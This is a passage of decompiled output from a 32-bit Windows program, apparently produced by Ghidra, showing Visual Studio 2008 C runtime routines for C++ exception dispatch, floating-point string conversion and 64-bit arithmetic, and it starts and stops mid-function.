    if ((iVar1 != 0) && (iVar1 = _ValidateRead(param_2,1), iVar1 != 0)) {
      iVar1 = *(int *)(param_1 + 0x18);
      *param_2 = iVar1;
LAB_004186be:
      iVar1 = ___AdjustPointer(iVar1,(int *)(param_4 + 8));
      *param_2 = iVar1;
      return '\0';
    }
  }
  _inconsistency();
  return '\0';
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___BuildCatchObject
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl ___BuildCatchObject(int param_1,int *param_2,uint *param_3,byte *param_4)

{
  char cVar1;
  undefined3 extraout_var;
  int *piVar2;
  
  piVar2 = param_2;
  if ((*param_3 & 0x80000000) == 0) {
    piVar2 = (int *)(param_3[2] + 0xc + (int)param_2);
  }
  cVar1 = ___BuildCatchObjectHelper(param_1,param_2,param_3,param_4);
  if (CONCAT31(extraout_var,cVar1) == 1) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  else if (CONCAT31(extraout_var,cVar1) == 2) {
    ___AdjustPointer(*(int *)(param_1 + 0x18),(int *)(param_4 + 8));
    FID_conflict__CallMemberFunction1(piVar2,*(undefined **)(param_4 + 0x18));
  }
  return;
}



// Library Function - Single Match
//  void __cdecl CatchIt(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,struct _s_HandlerType const *,struct _s_CatchableType const
// *,struct _s_TryBlockMapEntry const *,int,struct EHRegistrationNode *,unsigned char)
// 
// Library: Visual Studio 2008 Release

void __cdecl
CatchIt(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
       _s_FuncInfo *param_5,_s_HandlerType *param_6,_s_CatchableType *param_7,
       _s_TryBlockMapEntry *param_8,int param_9,EHRegistrationNode *param_10,uchar param_11)

{
  void *pvVar1;
  uint *unaff_EBX;
  int *unaff_ESI;
  int *unaff_EDI;
  int *piVar2;
  
  if (param_5 != (_s_FuncInfo *)0x0) {
    ___BuildCatchObject((int)param_1,unaff_ESI,unaff_EBX,(byte *)param_5);
  }
  if (param_7 == (_s_CatchableType *)0x0) {
    param_7 = (_s_CatchableType *)unaff_ESI;
  }
  _UnwindNestedFrames((EHRegistrationNode *)param_7,param_1);
  piVar2 = unaff_ESI;
  ___FrameUnwindToState((int)unaff_ESI,param_3,(int)param_4,*unaff_EDI);
  unaff_ESI[2] = unaff_EDI[1] + 1;
  pvVar1 = CallCatchBlock(param_1,(EHRegistrationNode *)unaff_ESI,(_CONTEXT *)param_2,
                          (_s_FuncInfo *)param_4,param_6,0x100,(ulong)piVar2);
  if (pvVar1 != (void *)0x0) {
    _JumpToContinuation(pvVar1,(EHRegistrationNode *)unaff_ESI);
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandlerForForeignException(struct EHExceptionRecord *,struct EHRegistrationNode
// *,struct _CONTEXT *,void *,struct _s_FuncInfo const *,int,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandlerForForeignException
          (EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
          _s_FuncInfo *param_5,int param_6,int param_7,EHRegistrationNode *param_8)

{
  _ptiddata p_Var1;
  void *pvVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  _s_TryBlockMapEntry *unaff_EBX;
  EHRegistrationNode *unaff_ESI;
  int unaff_EDI;
  uint extraout_var;
  uint uVar6;
  uint local_8;
  
  if (*(int *)param_1 != -0x7ffffffd) {
    p_Var1 = __getptd();
    uVar6 = extraout_var;
    if (p_Var1->_translator != (void *)0x0) {
      p_Var1 = __getptd();
      pvVar2 = (void *)__encoded_null();
      if (((p_Var1->_translator != pvVar2) && (*(int *)param_1 != -0x1fbcb0b3)) &&
         (iVar3 = _CallSETranslator(param_1,param_2,param_3,param_4,param_5,param_7,param_8),
         iVar3 != 0)) {
        return;
      }
    }
    if (*(int *)(param_5 + 0xc) == 0) {
      _inconsistency();
    }
    piVar4 = (int *)_GetRangeOfTrysToCheck
                              (param_5,param_7,param_6,&local_8,(uint *)&stack0xfffffff4);
    if (local_8 < uVar6) {
      do {
        if ((*piVar4 <= param_6) && (param_6 <= piVar4[1])) {
          iVar5 = piVar4[3] * 0x10 + piVar4[4];
          iVar3 = *(int *)(iVar5 + -0xc);
          if (((iVar3 == 0) || (*(char *)(iVar3 + 8) == '\0')) &&
             ((*(byte *)(iVar5 + -0x10) & 0x40) == 0)) {
            CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,
                    (_s_FuncInfo *)0x0,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                    unaff_EBX,unaff_EDI,unaff_ESI,(uchar)uVar6);
          }
        }
        local_8 = local_8 + 1;
        piVar4 = piVar4 + 5;
      } while (local_8 < uVar6);
    }
  }
  return;
}



// Library Function - Single Match
//  void __cdecl FindHandler(struct EHExceptionRecord *,struct EHRegistrationNode *,struct _CONTEXT
// *,void *,struct _s_FuncInfo const *,unsigned char,int,struct EHRegistrationNode *)
// 
// Library: Visual Studio 2008 Release

void __cdecl
FindHandler(EHExceptionRecord *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,
           _s_FuncInfo *param_5,uchar param_6,int param_7,EHRegistrationNode *param_8)

{
  _s_FuncInfo *p_Var1;
  uchar uVar2;
  bool bVar3;
  _ptiddata p_Var4;
  int iVar5;
  int *piVar6;
  EHRegistrationNode *unaff_EBX;
  _s_FuncInfo *p_Var7;
  _s_FuncInfo **pp_Var8;
  int unaff_ESI;
  _s_FuncInfo *p_Var9;
  _s_ESTypeList *unaff_EDI;
  EHRegistrationNode *pEVar10;
  bad_exception in_stack_ffffffd0;
  uint local_20;
  int local_1c;
  _s_FuncInfo *local_18;
  uint local_14;
  byte *local_10;
  int local_c;
  char local_5;
  
  local_5 = '\0';
  if (*(int *)(param_5 + 4) < 0x81) {
    local_c = (int)(char)param_2[8];
  }
  else {
    local_c = *(int *)(param_2 + 8);
  }
  if ((local_c < -1) || (*(int *)(param_5 + 4) <= local_c)) {
    _inconsistency();
  }
  p_Var9 = (_s_FuncInfo *)param_1;
  if (*(int *)param_1 != -0x1f928c9d) goto LAB_00418caf;
  p_Var7 = (_s_FuncInfo *)0x19930520;
  if (*(int *)(param_1 + 0x10) != 3) goto LAB_00418b1c;
  iVar5 = *(int *)(param_1 + 0x14);
  if (((iVar5 != 0x19930520) && (iVar5 != 0x19930521)) && (iVar5 != 0x19930522)) goto LAB_00418b1c;
  if (*(int *)(param_1 + 0x1c) != 0) goto LAB_00418b1c;
  p_Var4 = __getptd();
  if (p_Var4->_curexception != (void *)0x0) {
    p_Var4 = __getptd();
    param_1 = (EHExceptionRecord *)p_Var4->_curexception;
    p_Var4 = __getptd();
    param_3 = (_CONTEXT *)p_Var4->_curcontext;
    iVar5 = _ValidateRead(param_1,1);
    if (iVar5 == 0) {
      _inconsistency();
    }
    if ((((*(int *)param_1 == -0x1f928c9d) && (*(int *)((int)param_1 + 0x10) == 3)) &&
        ((iVar5 = *(int *)((int)param_1 + 0x14), iVar5 == 0x19930520 ||
         ((iVar5 == 0x19930521 || (iVar5 == 0x19930522)))))) && (*(int *)((int)param_1 + 0x1c) == 0)
       ) {
      _inconsistency();
    }
    p_Var4 = __getptd();
    if (p_Var4->_curexcspec == (void *)0x0) goto LAB_00418b1c;
    p_Var4 = __getptd();
    piVar6 = (int *)p_Var4->_curexcspec;
    p_Var4 = __getptd();
    iVar5 = 0;
    p_Var4->_curexcspec = (void *)0x0;
    uVar2 = IsInExceptionSpec(param_1,unaff_EDI);
    if (uVar2 != '\0') goto LAB_00418b1c;
    p_Var7 = (_s_FuncInfo *)0x0;
    if (0 < *piVar6) {
      do {
        bVar3 = type_info::operator==
                          (*(type_info **)(p_Var7 + piVar6[1] + 4),
                           (type_info *)&PTR_PTR__scalar_deleting_destructor__00423114);
        if (bVar3) goto LAB_00418aed;
        iVar5 = iVar5 + 1;
        p_Var7 = p_Var7 + 0x10;
      } while (iVar5 < *piVar6);
    }
    do {
      terminate();
LAB_00418aed:
      ___DestructExceptionObject((int *)param_1);
      std::bad_exception::bad_exception((bad_exception *)&stack0xffffffd0,s_bad_exception_004204b8);
      __CxxThrowException_8(&stack0xffffffd0,&DAT_00420dc4);
LAB_00418b1c:
      p_Var9 = (_s_FuncInfo *)param_1;
      if (((*(int *)param_1 == -0x1f928c9d) && (*(int *)(param_1 + 0x10) == 3)) &&
         ((p_Var1 = *(_s_FuncInfo **)(param_1 + 0x14), p_Var1 == p_Var7 ||
          ((p_Var1 == (_s_FuncInfo *)0x19930521 || (p_Var1 == (_s_FuncInfo *)0x19930522)))))) {
        if (*(int *)(param_5 + 0xc) != 0) {
          piVar6 = (int *)_GetRangeOfTrysToCheck(param_5,param_7,local_c,&local_14,&local_20);
          for (; local_14 < local_20; local_14 = local_14 + 1) {
            if ((*piVar6 <= local_c) && (local_c <= piVar6[1])) {
              local_10 = (byte *)piVar6[4];
              for (local_1c = piVar6[3]; 0 < local_1c; local_1c = local_1c + -1) {
                pp_Var8 = *(_s_FuncInfo ***)(*(int *)(param_1 + 0x1c) + 0xc);
                for (local_18 = *pp_Var8; 0 < (int)local_18; local_18 = local_18 + -1) {
                  pp_Var8 = pp_Var8 + 1;
                  p_Var9 = *pp_Var8;
                  iVar5 = ___TypeMatch(local_10,(byte *)p_Var9,*(uint **)(param_1 + 0x1c));
                  if (iVar5 != 0) {
                    local_5 = '\x01';
                    CatchIt(param_1,(EHRegistrationNode *)param_3,(_CONTEXT *)param_4,param_5,p_Var9
                            ,(_s_HandlerType *)param_7,(_s_CatchableType *)param_8,
                            (_s_TryBlockMapEntry *)unaff_EDI,unaff_ESI,unaff_EBX,
                            (uchar)in_stack_ffffffd0);
                    goto LAB_00418c05;
                  }
                }
                local_10 = local_10 + 0x10;
              }
            }
LAB_00418c05:
            piVar6 = piVar6 + 5;
          }
        }
        if (param_6 != '\0') {
          ___DestructExceptionObject((int *)param_1);
        }
        if ((((local_5 != '\0') || ((*(uint *)param_5 & 0x1fffffff) < 0x19930521)) ||
            (*(int *)(param_5 + 0x1c) == 0)) ||
           (uVar2 = IsInExceptionSpec(param_1,unaff_EDI), uVar2 != '\0')) goto LAB_00418cdb;
        __getptd();
        __getptd();
        p_Var4 = __getptd();
        p_Var4->_curexception = param_1;
        p_Var4 = __getptd();
        p_Var4->_curcontext = param_3;
        pEVar10 = param_8;
        if (param_8 == (EHRegistrationNode *)0x0) {
          pEVar10 = param_2;
        }
        _UnwindNestedFrames(pEVar10,param_1);
        ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
        FUN_00418454(*(void **)(param_5 + 0x1c));
        p_Var9 = param_5;
      }
LAB_00418caf:
      if (*(int *)(param_5 + 0xc) == 0) goto LAB_00418cdb;
      p_Var7 = param_5;
    } while (param_6 != '\0');
    FindHandlerForForeignException
              ((EHExceptionRecord *)p_Var9,param_2,param_3,param_4,param_5,local_c,param_7,param_8);
LAB_00418cdb:
    p_Var4 = __getptd();
    if (p_Var4->_curexcspec != (void *)0x0) {
      _inconsistency();
    }
  }
  return;
}



undefined4 * __thiscall FUN_00418cf3(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = &PTR_FUN_004204b0;
  return (undefined4 *)this;
}



// Library Function - Single Match
//  ___InternalCxxFrameHandler
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl
___InternalCxxFrameHandler
          (int *param_1,EHRegistrationNode *param_2,_CONTEXT *param_3,void *param_4,uint *param_5,
          int param_6,EHRegistrationNode *param_7,uchar param_8)

{
  _ptiddata p_Var1;
  undefined4 uVar2;
  
  p_Var1 = __getptd();
  if ((((*(int *)((p_Var1->_setloc_data)._cacheout + 0x27) != 0) || (*param_1 == -0x1f928c9d)) ||
      (*param_1 == -0x7fffffda)) ||
     (((*param_5 & 0x1fffffff) < 0x19930522 || ((*(byte *)(param_5 + 8) & 1) == 0)))) {
    if ((*(byte *)(param_1 + 1) & 0x66) == 0) {
      if ((param_5[3] != 0) || ((0x19930520 < (*param_5 & 0x1fffffff) && (param_5[7] != 0)))) {
        if ((*param_1 == -0x1f928c9d) &&
           (((2 < (uint)param_1[4] && (0x19930522 < (uint)param_1[5])) &&
            (*(code **)(param_1[7] + 8) != (code *)0x0)))) {
          uVar2 = (**(code **)(param_1[7] + 8))
                            (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
          return uVar2;
        }
        FindHandler((EHExceptionRecord *)param_1,param_2,param_3,param_4,(_s_FuncInfo *)param_5,
                    param_8,param_6,param_7);
      }
    }
    else if ((param_5[1] != 0) && (param_6 == 0)) {
      ___FrameUnwindToState((int)param_2,param_4,(int)param_5,-1);
    }
  }
  return 1;
}



// WARNING: Restarted to delay deadcode elimination for space: stack
// Library Function - Single Match
//  __CallSettingFrame@12
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __CallSettingFrame_12(undefined4 param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  
  pcVar1 = (code *)__NLG_Notify1(param_3);
  (*pcVar1)();
  if (param_3 == 0x100) {
    param_3 = 2;
  }
  __NLG_Notify1(param_3);
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_00419deb((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_00418ea5:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00418ee5;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_00418ed7:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00418ee5;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_00418ed7;
    goto LAB_00418ea5;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_00418ee5:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2008 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  _LocaleUpdate local_28 [8];
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate(local_28,_Locale);
  local_18 = FUN_00419deb((undefined2 *)&local_14,&local_2c,_Str,0,0,0,0,(int)local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_00418f4d:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00418f8d;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_00418f7f:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_00418f8d;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_00418f7f;
    goto LAB_00418f4d;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_00418f8d:
  iVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



// Library Function - Single Match
//  __fptostr
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __fptostr(char *_Buf,size_t _SizeInBytes,int _Digits,STRFLT _PtFlt)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  char cVar5;
  char *pcVar6;
  errno_t eVar7;
  
  pcVar6 = _PtFlt->mantissa;
  if ((_Buf == (char *)0x0) || (_SizeInBytes == 0)) {
    piVar1 = __errno();
    eVar7 = 0x16;
    *piVar1 = 0x16;
  }
  else {
    *_Buf = '\0';
    iVar2 = _Digits;
    if (_Digits < 1) {
      iVar2 = 0;
    }
    if (iVar2 + 1U < _SizeInBytes) {
      *_Buf = '0';
      pcVar3 = _Buf + 1;
      if (0 < _Digits) {
        do {
          cVar5 = *pcVar6;
          if (cVar5 == '\0') {
            cVar5 = '0';
          }
          else {
            pcVar6 = pcVar6 + 1;
          }
          *pcVar3 = cVar5;
          pcVar3 = pcVar3 + 1;
          _Digits = _Digits + -1;
        } while (0 < _Digits);
      }
      *pcVar3 = '\0';
      if ((-1 < _Digits) && ('4' < *pcVar6)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*_Buf == '1') {
        _PtFlt->decpt = _PtFlt->decpt + 1;
      }
      else {
        sVar4 = _strlen(_Buf + 1);
        _memmove(_Buf,_Buf + 1,sVar4 + 1);
      }
      return 0;
    }
    piVar1 = __errno();
    eVar7 = 0x22;
    *piVar1 = 0x22;
  }
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar7;
}



// Library Function - Single Match
//  ___dtold
// 
// Library: Visual Studio 2008 Release

void __cdecl ___dtold(uint *param_1,uint *param_2)

{
  uint uVar1;
  ushort uVar2;
  ushort uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar2 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar4 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar3 = uVar2 & 0x7ff;
  uVar1 = *param_2;
  local_8 = 0x80000000;
  if ((uVar2 & 0x7ff) == 0) {
    if (((param_2[1] & 0xfffff) == 0) && (uVar1 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_0041910f;
    }
    uVar3 = uVar3 + 0x3c01;
    local_8 = 0;
  }
  else if (uVar3 == 0x7ff) {
    uVar3 = 0x7fff;
  }
  else {
    uVar3 = uVar3 + 0x3c00;
  }
  param_1[1] = uVar1 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  *param_1 = uVar1 << 0xb;
  while (local_8 == 0) {
    uVar1 = param_1[1];
    uVar3 = uVar3 - 1;
    param_1[1] = uVar1 * 2 | *param_1 >> 0x1f;
    *param_1 = *param_1 * 2;
    local_8 = uVar1 * 2 & 0x80000000;
  }
  uVar4 = uVar4 | uVar3;
LAB_0041910f:
  *(ushort *)(param_1 + 2) = uVar4;
  return;
}



// Library Function - Single Match
//  __fltout2
// 
// Library: Visual Studio 2008 Release

STRFLT __cdecl __fltout2(_CRT_DOUBLE _Dbl,STRFLT _Flt,char *_ResultStr,size_t _SizeInBytes)

{
  int iVar1;
  errno_t eVar2;
  STRFLT p_Var3;
  short local_30;
  char local_2e;
  char local_2c [24];
  uint local_14;
  uint uStack_10;
  ushort uStack_c;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  ___dtold(&local_14,(uint *)&_Dbl);
  iVar1 = __I10_OUTPUT(local_14,uStack_10,uStack_c,0x11,0,&local_30);
  _Flt->flag = iVar1;
  _Flt->sign = (int)local_2e;
  _Flt->decpt = (int)local_30;
  eVar2 = _strcpy_s(_ResultStr,_SizeInBytes,local_2c);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  _Flt->mantissa = _ResultStr;
  p_Var3 = (STRFLT)___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return p_Var3;
}



// Library Function - Single Match
//  __alldvrm
// 
// Library: Visual Studio 2008 Release

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullshr
// 
// Library: Visual Studio 2008 Release

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



// Library Function - Single Match
//  __controlfp_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  uint uVar1;
  int *piVar2;
  errno_t eVar3;
  
  uVar1 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar1 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar1);
    }
    else {
      uVar1 = __control87(_NewValue,uVar1);
      *_CurrentState = uVar1;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar1 = __control87(0,0);
      *_CurrentState = uVar1;
    }
    piVar2 = __errno();
    eVar3 = 0x16;
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return eVar3;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_1
// Library Function - Single Match
//  __EH_prolog3_catch
// 
// Libraries: Visual Studio 2005, Visual Studio 2008, Visual Studio 2010, Visual Studio 2012

void __cdecl __EH_prolog3_catch(int param_1)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_1;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00422040 ^ (uint)&param_1;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// Library Function - Single Match
//  int __cdecl _ValidateRead(void const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl _ValidateRead(void *param_1,uint param_2)

{
  return (uint)(param_1 != (void *)0x0);
}



// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2008 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  uchar *puVar1;
  _LDBL12 *p_Var2;
  undefined4 uVar3;
  int iVar4;
  INTRNCVT_STATUS IVar5;
  int iVar6;
  byte bVar7;
  _LDBL12 **pp_Var8;
  _LDBL12 **pp_Var9;
  uint uVar10;
  undefined *puVar11;
  _LDBL12 *p_Var12;
  uint uVar13;
  int iVar14;
  int iVar15;
  bool bVar16;
  _LDBL12 *local_24 [2];
  int local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  _LDBL12 *local_8;
  
  local_18 = *(ushort *)(_Ifp->ld12 + 10) & 0x8000;
  p_Var2 = *(_LDBL12 **)(_Ifp->ld12 + 6);
  local_24[0] = p_Var2;
  uVar3 = *(undefined4 *)(_Ifp->ld12 + 2);
  uVar13 = *(ushort *)(_Ifp->ld12 + 10) & 0x7fff;
  iVar14 = uVar13 - 0x3fff;
  iVar4 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_24[1] = (_LDBL12 *)uVar3;
  local_1c = iVar4;
  if (iVar14 == -0x3fff) {
    iVar14 = 0;
    iVar4 = 0;
    do {
      if (local_24[iVar4] != (_LDBL12 *)0x0) {
        local_24[0] = (_LDBL12 *)0x0;
        local_24[1] = (_LDBL12 *)0x0;
        IVar5 = INTRNCVT_UNDERFLOW;
        goto LAB_00419864;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < 3);
    IVar5 = INTRNCVT_OK;
  }
  else {
    _Ifp = (_LDBL12 *)0x0;
    iVar15 = DAT_00423148 - 1;
    iVar6 = (int)(DAT_00423148 + ((int)DAT_00423148 >> 0x1f & 0x1fU)) >> 5;
    uVar10 = DAT_00423148 & 0x8000001f;
    local_14 = iVar14;
    local_10 = iVar6;
    if ((int)uVar10 < 0) {
      uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;
    }
    pp_Var9 = local_24 + iVar6;
    bVar7 = (byte)(0x1f - uVar10);
    local_c = 0x1f - uVar10;
    if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
      p_Var12 = (_LDBL12 *)((uint)local_24[iVar6] & ~(-1 << (bVar7 & 0x1f)));
      while( true ) {
        if (p_Var12 != (_LDBL12 *)0x0) {
          iVar6 = (int)(iVar15 + (iVar15 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (_LDBL12 *)0x0;
          puVar11 = (undefined *)(1 << (0x1f - ((byte)iVar15 & 0x1f) & 0x1f));
          pp_Var8 = local_24 + iVar6;
          _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + (int)puVar11);
          if (_Ifp < *pp_Var8) goto LAB_00419498;
          bVar16 = _Ifp < puVar11;
          do {
            local_8 = (_LDBL12 *)0x0;
            if (!bVar16) goto LAB_0041949f;
LAB_00419498:
            do {
              local_8 = (_LDBL12 *)0x1;
LAB_0041949f:
              iVar6 = iVar6 + -1;
              *pp_Var8 = _Ifp;
              if ((iVar6 < 0) || (local_8 == (_LDBL12 *)0x0)) {
                _Ifp = local_8;
                goto LAB_004194ad;
              }
              local_8 = (_LDBL12 *)0x0;
              pp_Var8 = local_24 + iVar6;
              _Ifp = (_LDBL12 *)((*pp_Var8)->ld12 + 1);
            } while (_Ifp < *pp_Var8);
            bVar16 = _Ifp == (_LDBL12 *)0x0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        p_Var12 = local_24[iVar6];
      }
    }
LAB_004194ad:
    *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_c & 0x1f));
    iVar6 = local_10 + 1;
    if (iVar6 < 3) {
      pp_Var9 = local_24 + iVar6;
      for (iVar15 = 3 - iVar6; iVar15 != 0; iVar15 = iVar15 + -1) {
        *pp_Var9 = (_LDBL12 *)0x0;
        pp_Var9 = pp_Var9 + 1;
      }
    }
    if (_Ifp != (_LDBL12 *)0x0) {
      iVar14 = uVar13 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_00423144 - DAT_00423148)) {
      local_24[0] = (_LDBL12 *)0x0;
      local_24[1] = (_LDBL12 *)0x0;
